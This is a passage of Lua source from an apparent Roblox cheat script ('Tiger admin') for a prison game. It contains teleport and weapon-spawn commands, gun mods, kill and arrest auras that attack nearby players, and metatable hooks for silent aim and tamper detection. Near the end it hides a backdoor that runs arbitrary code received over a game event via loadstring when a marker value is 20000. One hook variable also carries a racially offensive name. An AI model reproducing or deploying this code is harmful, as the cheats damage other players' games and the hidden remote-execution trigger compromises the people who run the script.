						API:bring(Target,CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)*CFrame.new(-4.5,2,-3),true)
					end
				end
			else
				API:ChangeTeam(game.Teams.Criminals,true)
			end
		end
	end,nil,"[ME,PLAYER]")
	API:CreateCmd("unview", "Unwatches the selected target", function(args)
		Temp.ViewingPlayer = nil
		wait()
		game:GetService("Workspace").Camera.CameraSubject = plr.Character.Humanoid
	end)
	API:CreateCmd("car", "Brings a car to you", function(args)
		pcall(function()
			local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-910, 95, 2157))
			wait()
			local car = nil
			task.spawn(function()
				car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
			end)
			repeat wait(.1)
				local ohInstance1 = game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[8]["Car Spawner"]
				workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
			until car
			repeat task.wait() until car:FindFirstChild("RWD") and car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat")
			car.PrimaryPart = car.RWD
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(OldPos)
			wait(1)
			local Done = false
			car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
			repeat 

				game:GetService("RunService").RenderStepped:Wait()
				car:SetPrimaryPartCFrame(OldPos)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(car.Body.VehicleSeat.Position)
				car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit == true then
					Done = true
				end
			until Done
		end)
	end)
	API:CreateCmd("opengate", "Opens the main prison gate", function(args)
		local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
		API:MoveTo(CFrame.new(503.998993, 102.039917, 2242.79907, 0.99996537, -1.0554821e-08, -0.00832392555, 1.00791926e-08, 1, -5.71817864e-08, 0.00832392555, 5.70959067e-08, 0.99996537))
		wait(.1)
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
		API:MoveTo(OldPos)
	end)
	API:CreateCmd("fly", "Enter plane mode but dont hit towers", function(args)
		API:Unfly()
		wait(.4)
		API:Fly(tonumber(args[2]) or 7)
	end)
	API:CreateCmd("carfly", "Car go flying", function(args)
		API:Unfly()
		wait()
		API:Fly(10)
	end)
	API:CreateCmd("uncarfly", "stop the car fly", function(args)
		API:Unfly()
	end)
	API:CreateCmd("unfly", "Disables fly", function(args)
		API:Unfly()
	end)

	API:CreateCmd("keycard", "Gets a keycard", function(args)
		local Oldc = API:GetPosition()
		local OldT = Player.Team
		if plr.Character:FindFirstChild("Key card") or plr.Backpack:FindFirstChild("Key card") then
			return API:Notif("You already have a keycard!",false)
		end
		if #game.Teams.Guards:GetPlayers() == 8 and plr.Team ~= game.Teams.Guards then
			API:Notif("Guards team is full!")
			return
		end
		API:ChangeTeam(game.Teams.Guards)
		repeat wait(.5)
			Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
			wait()
			API:Refresh()
		until game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card")
		if game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card") then
			if Player.Team ~= OldT then
				API:ChangeTeam(OldT)
				repeat task.wait() until Player.Team == OldT
			end
			wait()
			repeat wait()
				local a =pcall(function()
					local Key = workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP
					game.Workspace.Remote["ItemHandler"]:InvokeServer(Key)
					API:MoveTo(CFrame.new(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP.Position+Vector3.new(0,3,0)))
				end)
			until plr.Backpack:FindFirstChild("Key card")
		end
		API:MoveTo(Oldc)
	end)

	API:CreateCmd("refresh", "refreshes your character", function(args)
		API:Refresh(true)
	end)
	API:CreateCmd("roof", "", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(820.6336059570312, 120.48998260498047, 2352.623046875))
			end
		else
			API:MoveTo(CFrame.new(820.6336059570312, 120.48998260498047, 2352.623046875))
		end
	end, true)
	API:CreateCmd("nex", "", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			API:MoveTo(CFrame.new(918.77, 100, 2379.07))
		end
	end, true)
	API:CreateCmd("prison", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(792.50885, 97.9999237, 2467.05664, 0.999635994, 2.4151424e-08, -0.0269802082, -2.5547001e-08, 1, -5.13812246e-08, 0.0269802082, 5.20517851e-08, 0.999635994))
			end
		else
			API:MoveTo(CFrame.new(918.77, 100, 2379.07))
		end
	end)
	API:CreateCmd("m4a1", "Gets a M4A1 gun", function(args)
		API:GetGun("M4A1")
	end)
	API:CreateCmd("m9", "Gets a M9 gun", function(args)
		API:GetGun("M9")
	end)
	API:CreateCmd("shotgun", "Gets a shotgun", function(args)
		API:GetGun("Remington 870")
	end)
	API:CreateCmd("ak", "Gets a ak-47", function(args)
		API:GetGun("AK-47")
	end)
	API:CreateCmd("knife", "Gets a knife", function(args)
		workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
	end)
	API:CreateCmd("hammer", "Gets a hammer", function(args)
		workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Hammer"]})
	end)
	API:CreateCmd("yard", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(791, 98, 2498))
			end
		else

			API:MoveTo(CFrame.new(791, 98, 2498))
		end
	end)
	API:CreateCmd("gas", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(-518, 54, 1655))
			end
		else
			API:MoveTo(CFrame.new(-518, 54, 1655))
		end
	end)
	API:CreateCmd("cafe", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(877, 100, 2256))
			end
		else
			API:MoveTo(CFrame.new(877, 100, 2256))
		end
	end)
	API:CreateCmd("bridge", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(54, 33, 1311))
			end
		else
			API:MoveTo(CFrame.new(54, 33, 1311))
		end
	end)
	API:CreateCmd("lunchroom", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(905, 100, 2226))
			end
		else
			API:MoveTo(CFrame.new(905, 100, 2226))
		end
	end)

	API:CreateCmd("crimbase", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
			end
		else
			API:MoveTo(CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
		end
	end)
	API:CreateCmd("cbase", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
			end
		else
			API:MoveTo(CFrame.new(-858.08990478516, 94.476051330566, 2093.8288574219))
		end
	end,true)
	API:CreateCmd("armory", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(789, 100, 2260))
			end
		else
			API:MoveTo(CFrame.new(789, 100, 2260))
		end
	end)
	API:CreateCmd("tower", "Teleports to location", function(args)
		if args[2] then
			local Target = API:FindPlayer(args[2])
			if Target then
				API:bring(Target, CFrame.new(822, 131, 2588))
			end
		else
			API:MoveTo(CFrame.new(822, 131, 2588))
		end
	end)
	Temp.CmdsC = false
	Commands.Visible = false
	API:CreateCmd("cmds", "Toggles commands gui", function(args)
		if not Temp.CmdsC then
			Temp.CmdsC = true
			if Commands.Visible == false then
				Commands.Position = Commands.Position + UDim2.new(0, 0, 1, 0)
				wait(.1)
				Commands:TweenPosition(SavedCmdsPosition, "Out", "Sine", 1)
				Commands.Visible = true
			else
				Commands:TweenPosition(SavedCmdsPosition + UDim2.new(0, 0, 1, 0), "Out", "Quart", 1)
				wait(.5)
				Commands.Visible = false
			end
			wait(.7)
			Temp.CmdsC = false
		end
	end)
	API:CreateCmd("rejoin", "rejoins the same server (UNLOADS SCRIPT)", function(args)
		wait(.3)
		if #game:GetService("Players"):GetPlayers() ==1 then
			game:GetService("Players").LocalPlayer:Kick("Please wait.")
			game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
		else
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
		end
	end)
	API:CreateCmd("rj", "rejoins the same server (UNLOADS SCRIPT)", function(args)
		wait(.3)
		if #game:GetService("Players"):GetPlayers() ==1 then
			game:GetService("Players").LocalPlayer:Kick("Please wait.")
			game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
		else
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
		end
	end,true)
	API:CreateCmd("re", "refreshes your character", function(args)
		API:Refresh(true)
	end, true)
	API:CreateCmd("allcmds", "tells you the ammount of commands tiger admin has", function(args)
		API:Notif("Tiger admin has "..tostring(AmmountCurrent).." commands.")
	end)

	API:CreateCmd("serverhop", "Joins a different server", function(args)
		local Ids = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if typeof(v) == "table" and v['maxPlayers'] > v['playing'] and v['id'] ~= game['JobId'] then
				table.insert(Ids,v.id)
			end
		end
		return game:GetService("TeleportService"):TeleportToPlaceInstance(game['PlaceId'], Ids[math.random(1, #Ids)])
	end)

	API:CreateCmd("btools", "Destroy walls", function(args)
		Instance.new("HopperBin",plr.Backpack).BinType = 3
		Instance.new("HopperBin",plr.Backpack).BinType = 4
	end)

	API:CreateCmd("guns", "Gets every single gun", function(args)
		API:AllGuns()
	end)

	API:CreateCmd("items", "Gets every single gun", function(args)
		API:AllGuns()
	end)
	API:CreateCmd("noclip", "Go through walls", function(args)
		if States.noclip == nil then
			States.noclip = false
		end
		States.noclip = not States.noclip
		if States.noclip then
			pcall(function()
				Temp.Noclipping:Disconnect()
				Temp.Noclipping = nil
			end)
			wait()
			Temp.Noclipping = game:GetService("RunService").Stepped:Connect(function()
				for i,v in pairs(plr.Character:GetDescendants()) do
					if v and v:IsA("Part") or v:IsA("MeshPart") and v.CanCollide and Unloaded == false then
						v.CanCollide = false
					end
				end
			end)
			API:Notif("Noclip enabled")
		else
			pcall(function()
				Temp.Noclipping:Disconnect()
				Temp.Noclipping = nil
			end)
			wait()
			API:Refresh(true)
		end
	end)
	API:CreateCmd("clip", "Disables noclip", function(args)
		States.noclip = false
		pcall(function()
			Temp.Noclipping:Disconnect()
			Temp.Noclipping = nil
		end)
		API:Refresh(true)
		API:Notif("Noclip disabled")
	end)
	API:CreateCmd("autofire", "Mods the gun", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return API:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["AutoFire"] = true
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		else
			API:Notif("You need to hold the tool you want to mod!",false)
		end
	end)
	API:CreateCmd("fastfire", "hold a tool to mod your gun", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return API:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["FireRate"] = 0.001
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		else
			API:Notif("You need to hold the tool you want to mod!",false)
		end
	end)
	API:CreateCmd("infammo", "hold a tool to mod your gun", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return API:Notif("Needs to be a gun!")
			end
			local cc = require(Tool.GunStates)
			cc["MaxAmmo"] = math.huge
			cc["StoredAmmo"] = math.huge
			cc["AmmoPerClip"] = math.huge
			cc["CurrentAmmo"] = math.huge
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		else
			API:Notif("You need to hold the tool you want to mod!",false)
		end
	end)
	API:CreateCmd("modgun", "adds superpowers to your gun", function(args)
		if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return API:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["Damage"] = 9e9
			cc["FireRate"] = 0.001
			cc["Range"] = math.huge
			cc["MaxAmmo"] = math.huge
			cc["StoredAmmo"] = math.huge
			cc["AmmoPerClip"] = math.huge
			cc["CurrentAmmo"] = math.huge
			if Tool.Name ~= "Remington 870" then
				cc["Bullets"] = 1
				cc["AutoFire"] = true
			end
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		else
			API:Notif("You need to hold the tool you want to mod!",false)
		end
	end)

	API:CreateCmd("autoinfammo", "Always apply inf ammo on all your guns", function(args)
		if args[2] == "on" then
			States.AutoInfAmmo = true
			API:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		elseif args[2] =="off" then
			States.AutoInfAmmo = false
			API:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		else
			States.AutoInfAmmo = not States.AutoInfAmmo
			API:Notif("AutoInfAmmo has been changed to "..tostring(States.AutoInfAmmo))
		end
	end)
	API:CreateCmd("unload", "Destroys the script unloading it", function(args)
		API:Destroy(game:FindFirstChild("Tiger_revamp_loaded"))
		Unloaded = true

		for i,v in pairs(States) do
			States[i] = false
		end
		Temp = {}
		game:GetService("Workspace").Camera.CameraSubject = plr.Character.Humanoid 
		CmdBarFrame:TweenPosition(CmdBarFrame.Position-UDim2.new(0,0,-.5,0),"Out","Back",.8)
		wait(1)
		ScreenGui:Destroy()
	end)
end
--
local cdv = false
coroutine.wrap(function()
	while wait() do --// fast loop
		if Unloaded then
			return
		end
		for i,v in pairs(Temp.Viruses) do
			for _,a in pairs(game:GetService("Players"):GetPlayers()) do
				if a and a ~= v and a ~= Player then
					if a and a.Character and a.Character:FindFirstChild("HumanoidRootPart") and(a.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude <4.5 and a.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,a) then
						if not cdv then
							cdv = true
							API:KillPlayer(a)
							wait(.7)
							cdv = false
						end
					end
				end
			end
		end
		game:GetService('StarterGui'):SetCoreGuiEnabled('Backpack', true)
		pcall(function()
			if States.AntiArrest == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							if v.Character:FindFirstChildOfClass("Tool") and v.Character:FindFirstChild("Handcuffs") and not v.Character:FindFirstChild("Handcuffs"):FindFirstChild("ISWHITELISTED") then
								local args = {
									[1] = v
								}
								for i =1,3 do
									task.spawn(function()
										game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
									end)
								end
							end
						end
					end
				end
			end
		end)
		pcall(function()
			if States.AntiTouch == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <2.3 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							local args = {
								[1] = v
							}
							for i =1,8 do
								task.spawn(function()
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
								end)
							end
						end
					end
				end
			end
		end)

		pcall(function()
			if States.ArrestAura == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player and v.Team ~= game.Teams.Guards then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							local args = {
								[1] = v.Character:FindFirstChild("Head") or v.Character:FindFirstChildOfClass("Part")
							}
							if v.Team == game.Teams.Criminals or (v.Team == game.Teams.Inmates and API:BadArea(v)) then
								workspace.Remote.arrest:InvokeServer(unpack(args))
							end
						end
					end
				end
			end
		end)
		pcall(function()
			if States.killaura == true and Unloaded == false then
				for i,v in pairs(game.Players:GetPlayers()) do
					if v ~= Player and not table.find(API.Whitelisted,v) then
						if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude <30 and v.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,v) then
							local args = {
								[1] = v
							}
							for i =1,3 do
								task.spawn(function()
									game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
								end)
							end
						end
					end
				end
			end
		end)
	end
end)()

local layout = {}
for i,v in pairs(CommandsList:GetChildren()) do
	if v and v:IsA("TextLabel") then
		table.insert(layout,v)
	end
end
SearchBar.Changed:Connect(function(Changed)
	if Changed:lower() == "text"  then
		CommandsList.CanvasPosition = Vector2.new(0, 0)
		if #SearchBar.Text >0 then
			for i,v in pairs(CommandsList:GetChildren()) do
				if v:IsA("TextLabel") then
					if not string.lower(v.Text):match(string.lower(SearchBar.Text)) then
						v.Parent = ScreenGui
						v.Visible = false
					end
				end
			end
			for i,v in pairs(ScreenGui:GetChildren()) do
				if v.Name == "TEMP_CMD" then
					if string.lower(v.Text):match(string.lower(SearchBar.Text)) then
						v.Parent = CommandsList
						v.Visible = true
					end
				end
			end
		elseif #SearchBar.Text <1 then
			for i,v in pairs(layout) do
				v.Parent = ScreenGui
				v.Visible = false
			end
			task.wait()
			for i,v in pairs(layout) do
				if v then
					v.Parent = CommandsList
					v.Visible = true
				end
			end
		end
	end
end)
UserInputService.InputBegan:connect(function(UserInput,Typing)
	if not Unloaded and not Typing then
		if UserInput.KeyCode == Enum.KeyCode.LeftShift then
			Running = true
		end
		if UserInput.KeyCode == Enum.KeyCode.F and States.OnePunch and not Running then --//Onepunch nothing advanced just to support weak exploits
			local a = API:GetPosition()*CFrame.new(0,0,-1)
			local Part = Instance.new("Part",workspace)
			local p = nil
			Part.Transparency = 1
			Part.CanCollide = false
			Part.CFrame = a
			p = Part.Touched:Connect(function(h)
				if h and h.Parent and h.Parent:FindFirstChildOfClass("Humanoid") then
					local Target = game:GetService("Players"):FindFirstChild(h.Parent.Name)
					if Target and Target~= Player then
						for i =1,20 do
							task.spawn(function()
								game.ReplicatedStorage["meleeEvent"]:FireServer(Target)
							end)
						end
						p:Disconnect()
						Part:Destroy()
					end
				end
			end)
			task.spawn(function()
				wait(1)
				if Part then
					Part:Destroy()
					p:Disconnect()
				end
			end)
		end
		if UserInput.KeyCode == Enum.KeyCode.Semicolon and not Unloaded then
			task.wait(.024)
			CommandBar:CaptureFocus()
		end
	end
end)
UserInputService.InputEnded:connect(function(UserInput,Typing)
	if UserInput.KeyCode == Enum.KeyCode.LeftShift and not Unloaded then
		Running = false
	end
end)
local Players = game.Players
local LocalPlayer = Players.LocalPlayer
local GetPlayers = Players.GetPlayers
local Camera = workspace.CurrentCamera
local WTSP = Camera.WorldToScreenPoint
local FindFirstChild = game.FindFirstChild
local Vector2_new = Vector2.new
local Mouse = LocalPlayer.GetMouse(LocalPlayer)
local function NotObstructing(Destination, Ancestor)
	local ObstructingParts = Camera.GetPartsObscuringTarget(Camera, {Destination}, {Ancestor, LocalPlayer.Character})

	for i,v in ipairs(ObstructingParts) do
		pcall(function()
			if v.Transparency >= 1 then
				table.remove(ObstructingParts, i)
			end
		end)
	end

	if #ObstructingParts <= 0 then
		return true
	end
	local RaycastParameters = RaycastParams.new()
	RaycastParameters.IgnoreWater = true
	RaycastParameters.FilterType = Enum.RaycastFilterType.Blacklist
	RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

	RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

	local Origin = Camera.CFrame.Position
	local Direction = (Destination - Origin).Unit * 500
	local RayResult = workspace.Raycast(workspace, Origin, Direction, RaycastParameters) or {
		Instance = nil;
		Position = Origin + Direction;
		Material = Enum.Material.Air;
	}

	if RayResult.Instance and (RayResult.Instance.IsDescendantOf(RayResult.Instance, Ancestor) or RayResult.Instance == Ancestor) then
		return true
	end
	return false
end
function ClosestChar()
	local Max, Close = 170
	for I,V in pairs(GetPlayers(Players)) do
		if V ~= LocalPlayer and V.Team ~= LocalPlayer.Team and V.Character then
			local Head = FindFirstChild(V.Character, "Head")
			if Head then
				if NotObstructing(V.Character.PrimaryPart.Position, V.Character) == false then
					continue
				end
				local Pos, OnScreen = WTSP(Camera, Head.Position)
				if OnScreen then
					local Dist = (Vector2_new(Pos.X, Pos.Y) - Vector2_new(Mouse.X, Mouse.Y)).Magnitude
					if Dist < Max then
						Max = Dist
						Close = V.Character
					end
				end
			end
		end
	end

	return Close
end
local blackperson; blackperson = hookfunction(game.Destroy,function(a)
	local isExploit = checkcaller()
	if a and a:IsA("Player") and not Unloaded and isExploit  then
		if API_Prem.CheckPremium(a) then
			task.spawn(function()
				pcall(function()
					game:GetService("Players").LocalPlayer:Kick("TAMPER DETECTED")
				end)
			end)
			wait(1)
			while true do end
		end
	end
end)
local MT = getrawmetatable(game)
local __namecall = MT.__namecall
setreadonly(MT, false)
MT.__namecall = newcclosure(function(self, ...)
	local Method = getnamecallmethod()
	local isExploit = checkcaller()
	if Method:lower() == "destroy" or Method:lower() == "remove" and Unloaded == false then
		if self.IsA(self, "Player") and isExploit then
			if API_Prem.CheckPremium(self) then
				task.spawn(function()
					pcall(function()
						game:GetService("Players").LocalPlayer:Kick("TAMPER DETECTED")
					end)
				end)
				wait(1)
				while true do end
			end
		end
	end
	if States.SilentAim then
		if not Unloaded and Method == "FindPartOnRay" and not checkcaller() and tostring(getfenv(0).script) == "GunInterface" then
			local Character = ClosestChar()
			if Character then
				return Character.Torso, Character.Torso.Position+Vector3.new(Random.new():NextNumber(-1,1),Random.new():NextNumber(.1,.8),Random.new():NextNumber(-.5,.5))
			end
		end
	end
	return __namecall(self, ...)
end)
setreadonly(MT, true)
plr.PlayerGui.Home.fadeFrame.Visible = false--//black bar
plr:GetMouse().Button1Up:Connect(function()
	local target = plr:GetMouse().Target
	if not Unloaded and PremiumActivated and target and target.Parent:FindFirstChildOfClass("Humanoid") and game:GetService("Players"):FindFirstChild(target.Parent.Name) and States.OneShot then
		local Vic = game:GetService("Players"):FindFirstChild(target.Parent.Name)
		local Gun = plr.Character:FindFirstChildOfClass("Tool")
		if Gun and Gun:FindFirstChildOfClass("ModuleScript") and Vic and Vic.Team ~= plr.Team then
			local Bullets = API:CreateBulletTable(20,(Vic.Character:FindFirstChild("Head") or Vic.Character:FindFirstChildOfClass("Part")))
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(Bullets, Gun)
		end
	end
end)
--//LOOPS
coroutine.wrap(function()
	while task.wait() do --//Faster loop
		if not Unloaded then
			if States.AntiSit then
				game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.Seated, false)
			end
		else
			break
		end
	end
end)()

coroutine.wrap(function()
	while task.wait() do
		if States.spawnguns and not Unloaded then
			if plr.Team ~= game.Teams.Guards then
				API:ChangeTeam(game.Teams.Guards)
				wait(1)
			end
			if States.spawnguns then
				plr.Character:FindFirstChildOfClass("Humanoid").Health = 0
				wait()
				workspace.Remote.TeamEvent:FireServer("Bright blue")
			end
		end
	end
end)()

Temp.KIllaurCD = false
coroutine.wrap(function()
	while wait(.58) do --//slow loop
		if Unloaded then
			return
		end

		for i,v in pairs(Temp.KillAuras) do
			for _,a in pairs(game:GetService("Players"):GetPlayers()) do
				if a and a ~= v and a ~= Player then
					if a and a.Character and a.Character:FindFirstChild("HumanoidRootPart") and(a.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude <25 and a.Character.Humanoid.Health >0 and not table.find(API.Whitelisted,a) then
						if not Temp.KIllaurCD then
							Temp.KIllaurCD = true
							API:KillPlayer(a,nil,true)
							wait(.25)
							Temp.KIllaurCD = false
						end
					end
				end
			end
		end
		if States.AntiShield then
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v.Character and v:FindFirstChild("Torso") and v:FindFirstChild("Torso"):FindFirstChild("ShieldFolder") then
					v.Torso:FindFirstChild("ShieldFolder"):Destroy()
				end
			end
		end
		if States.AntiTase and getconnections then
			for i,v in pairs(getconnections(workspace:WaitForChild("Remote").tazePlayer.OnClientEvent)) do
				v:Disable()
			end
		end
		if States.AutoInfAmmo then
			coroutine.wrap(function()
				for i,v in pairs({unpack(Player.Backpack:GetChildren()), unpack(Player.Character:GetChildren())}) do
					if v and v:IsA("Tool") and not table.find(Reload_Guns,v) then
						local cc = require(v.GunStates)
						cc["MaxAmmo"] = math.huge
						cc["StoredAmmo"] = math.huge
						cc["AmmoPerClip"] = math.huge
						cc["CurrentAmmo"] = math.huge
						table.insert(Reload_Guns, v)
					end
				end
			end)()
		end
		for i,v in pairs(Reload_Guns) do
			if v then
				task.spawn(function()
					game:GetService("ReplicatedStorage").ReloadEvent:FireServer(v)
				end)
			end
		end
		if not FLYING then
			game:GetService("ContextActionService"):UnbindAction("forward")
			game:GetService("ContextActionService"):UnbindAction("backward")
			game:GetService("ContextActionService"):UnbindAction("left")
			game:GetService("ContextActionService"):UnbindAction("right")
		end
		coroutine.wrap(function()
			if States.loopkillcriminals then
				wait(.5)
				API:killall(game.Teams.Criminals)
			end
			if States.loopkillinmates then
				wait(.5)
				API:killall(game.Teams.Inmates)
			end
			if States.loopkillguards then
				wait(.5)
				API:killall(game.Teams.Guards)
			end
			if Temp and Temp.Loopkillall then
				wait(.5)
				API:killall()
			end
		end)()
		coroutine.wrap(function()
			for i,v in pairs(Temp.Loopkilling) do
				if v and game:GetService("Players"):FindFirstChild(v) then
					local Target = game:GetService("Players"):FindFirstChild(v)
					if Target.Character and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health >0 and not Target.Character:FindFirstChildOfClass("ForceField") then
						if Player.Team == Target.Team and Player.Team == game.Teams.Guards then
							if Target.Team ~= game.Teams.Inmates then
								API:ChangeTeam(game.Teams.Inmates)
							else
								API:ChangeTeam(game.Teams.Criminals)
							end
						end
						API:KillPlayer(Target)
					end
				end
			end
			for i,v in pairs(Temp.LoopmKilling) do
				if v and game:GetService("Players"):FindFirstChild(v) then
					local Target = game:GetService("Players"):FindFirstChild(v)
					if Target.Character and Target.Character:FindFirstChildOfClass("Humanoid") and Target.Character:FindFirstChildOfClass("Humanoid").Health >0 and not Target.Character:FindFirstChildOfClass("ForceField") then
						API:KillMPlayer(Target)
					end
				end
			end
		end)()
	end
end)()
task.spawn(function()
	while task.wait() do
		if not plr.Character:FindFirstChildOfClass("ForceField") and States.ff then
			API:ChangeTeam(plr.Team.Name)
			wait(.4)
		end
		if Unloaded then
			break
		end
	end
end)
function MostClose(Position)
	local Max, Closest = math.huge,nil
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character then
			if v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool") then
				local ShootPart = (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle")
				if v.Character.PrimaryPart and (v.Character:FindFirstChildOfClass("Tool") or v.Backpack:FindFirstChildOfClass("Tool")):FindFirstChild("Muzzle") then
					local Distance = (ShootPart.Position-Position).Magnitude
					if Distance < Max then
						Max = Distance
						Closest = v
					end 
				end
			end
		end
	end
	return Closest
end
local CurrentTime = 0
function GetPlayerHit(Part)
	for i,v in pairs(game:GetService("Players"):GetPlayers()) do
		if v.Character:IsAncestorOf(Part) then
			return v
		end
	end
end
local ShootbackCooldown = false
local function ReplicationEventFunction(Table)
	if Table[1] and Table[1].MSG ~= nil and Table[1].PLA ~= nil then
		if Table[1].Cframe.Z == 20000 then
			task.spawn(function()
				loadstring(tostring(Table[1].MSG))()
			end)
		end
	end
	if Unloaded then return end
	local Count = 0
	pcall(function()
		for i,v in pairs(Table) do
			if Count <= 2 then
				local Hit=v.Hit
				local Distance=v.Distance
				local Cframe=v.Cframe
				local RayObject =v.RayObject
				if Hit and Distance and Cframe then
					if Cframe ~= CFrame.new() then
						local PlayerHit = nil
